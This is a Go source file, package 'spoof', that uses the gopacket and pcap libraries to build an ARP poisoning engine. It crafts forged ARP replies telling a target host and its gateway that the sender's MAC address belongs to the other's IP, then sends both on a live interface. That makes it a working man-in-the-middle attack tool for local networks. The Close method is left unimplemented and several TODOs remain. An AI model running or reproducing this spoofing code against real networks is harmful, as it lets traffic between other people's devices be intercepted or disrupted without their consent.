package spoof

import (
	"errors"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"net"
	"strings"
)

type Engine struct {
	poisonTargetPacket  layers.ARP
	poisonGatewayPacket layers.ARP
	ethernetPacket      layers.Ethernet
	handle              *pcap.Handle
}

func (engine *Engine) Poison() error {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}

	// Send ARP poison to the target
	serializationError := gopacket.SerializeLayers(
		buf,
		opts,
		&engine.ethernetPacket,
		&engine.poisonTargetPacket,
	)
	if serializationError != nil {
		return serializationError
	}
	packetData := buf.Bytes()

	writeError := engine.handle.WritePacketData(packetData[:42])
	if writeError != nil {
		return writeError
	}

	// Send ARP poison to the gateway
	buf = gopacket.NewSerializeBuffer()
	opts = gopacket.SerializeOptions{}

	// Send ARP poison to the target
	serializationError = gopacket.SerializeLayers(
		buf,
		opts,
		&engine.ethernetPacket,
		&engine.poisonGatewayPacket,
	)
	if serializationError != nil {
		return serializationError
	}
	packetData = buf.Bytes()

	writeError = engine.handle.WritePacketData(packetData[:42])
	if writeError != nil {
		return writeError
	}

	return nil
}

func (engine *Engine) Close() error {
	panic("Implement me")
}

func findInterfaceIpAndMac(iFace string) (net.HardwareAddr, error) {
	// TODO: Check if this solution is cross platform
	devices, findError := pcap.FindAllDevs()
	if findError != nil {
		return nil, findError
	}
	var selectedDevice pcap.Interface
	found := false
	for _, device := range devices {
		if device.Name == iFace {
			selectedDevice = device
			found = true
			break
		}
	}
	if !found {
		return nil, errors.New("device not found")
	}

	var deviceAddress net.IP = nil
	for _, address := range selectedDevice.Addresses {
		deviceAddress = address.IP
	}
	if deviceAddress == nil {
		return nil, errors.New("not available addresses")
	}

	netInterfaces, getError := net.Interfaces()
	if getError != nil {
		return nil, getError
	}
	var deviceMac net.HardwareAddr
	found = false
macLoop:
	for _, device := range netInterfaces {
		addresses, getAddressesError := device.Addrs()
		if getAddressesError != nil {
			// TODO: Check the error?
			continue
		}
		for _, address := range addresses {
			if strings.Index(address.String(), deviceAddress.String()) == 0 {
				deviceMac = device.HardwareAddr
				found = true
				break macLoop
			}
		}
	}
	if !found {
		return nil, errors.New("could not find mac address")
	}

	return deviceMac, nil
}

func NewEngine(ip, gateway, iFace string) (*Engine, error) {
	interfaceMac, findError := findInterfaceIpAndMac(iFace)
	if findError != nil {
		return nil, findError
	}

	handle, openError := pcap.OpenLive(iFace, 65536, true, 0) // TODO: Fix me
	if openError != nil {
		return nil, openError
	}

	targetIP := net.ParseIP(ip)
	gatewayIP := net.ParseIP(gateway)

	targetARP := layers.ARP{
		AddrType:          handle.LinkType(),
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6, // Length of a mac address
		ProtAddressSize:   4, // Length of a IPv4 ip
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(interfaceMac),
		SourceProtAddress: []byte(gatewayIP.To4()),
		DstHwAddress:      []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, // NOTE: What if the router requires this to be specified?
		DstProtAddress:    []byte(targetIP.To4()),
	}

	gatewayARP := layers.ARP{
		AddrType:          handle.LinkType(),
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6, // Length of a mac address
		ProtAddressSize:   4, // Length of a IPv4 ip
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(interfaceMac),
		SourceProtAddress: []byte(targetIP.To4()),
		DstHwAddress:      []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, // NOTE: What if the router requires this to be specified?
		DstProtAddress:    []byte(gatewayIP.To4()),
	}

	ethernetPacket := layers.Ethernet{
		SrcMAC:       interfaceMac,
		DstMAC:       []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}

	engine := &Engine{
		poisonTargetPacket:  targetARP,
		poisonGatewayPacket: gatewayARP,
		ethernetPacket:      ethernetPacket,
		handle:              handle,
	}
	return engine, nil
}
